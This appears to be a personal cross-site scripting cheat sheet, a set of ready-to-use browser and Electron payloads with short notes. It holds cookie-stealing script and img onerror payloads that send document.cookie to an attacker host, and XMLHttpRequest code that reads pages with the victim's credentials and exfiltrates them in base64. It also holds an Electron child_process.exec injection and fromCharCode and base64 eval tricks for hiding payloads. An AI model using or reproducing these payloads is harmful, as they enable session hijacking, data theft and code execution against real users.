## browser

### steal cookie
```js
<script>new Image().src="http://10.11.0.4/cool.jpg?output="+document.cookie;</script>
<img src='' onerror="document.location=`http://<ip_address>/${document.cookie}`">
```
```
https://www.youtube.com/watch?v=qNsbf3EmLrA&t=659s

Sometimes , the 'script' tag did not load a JavaScript source in dynamically rendered HTML is because the browser have already finished parsing the HTML document before the 'script' tag is added to the DOM.

As for the 'img' tag, it works differently because images are not executed like scripts. The browser will request the image file specified in the src attribute and display it in the document when it is loaded.
```

### steal page
```html
<img src='' onerror=import('http://attacker/pwn.js');>
<!-- remember to set CORS header on the attacker site -->
```
```js
// http only cookie, GET
var xhttp = new XMLHttpRequest();
    xhttp.onreadystatechange = function() {
        if (this.readyState == 4 && this.status == 200) {
   
            str2=btoa(unescape(encodeURIComponent(this.responseText)));
            document.location=`http://attacker/${str2}`;
       }
    };
    xhttp.open("GET", "http://10.10.45.45/2", true);
     xhttp.withCredentials = true;
    xhttp.send();
```
```js
// http only cookie, POST data
var xhttp = new XMLHttpRequest();
    xhttp.onreadystatechange = function() {
        if (this.readyState == 4 && this.status == 200) {
   
            // str2=btoa(this.responseText);
            str2=btoa(unescape(encodeURIComponent(this.responseText)));
            var xhttp2 = new XMLHttpRequest();
            xhttp2.open("POST", "http://attacker", true);
            xhttp2.send(str2);
       }
    };
    xhttp.open("GET", "http://10.10.45.45/2", true);
    xhttp.withCredentials = true;
    xhttp.send();
```
```js
 // str2=btoa(this.responseText);   https://cms.35g.tw/coding/javascript-btoa-string-contains-an-invalid-character/; btoa Uncaught DOMException: String contains an invalid character
```
## node/electron
```js
<script>require('child_process').exec('something')</script>
```

## javascript encode

### url encode
```js
function encode_to_javascript(string) {
            var input = string
            var output = '';
            for(pos = 0; pos < input.length; pos++) {
                output += input.charCodeAt(pos);
                if(pos != (input.length - 1)) {
                    output += ",";
                }
            }
            return output;
        }
        
let encoded = encode_to_javascript('insert_minified_javascript')
console.log(encoded)
```

```js
<script>eval(String.fromCharCode(118,97,114,...))</script>
```

### base64 encode
```js
btoa("insert_minified_javascript")
eval(atob("base64_string"))
```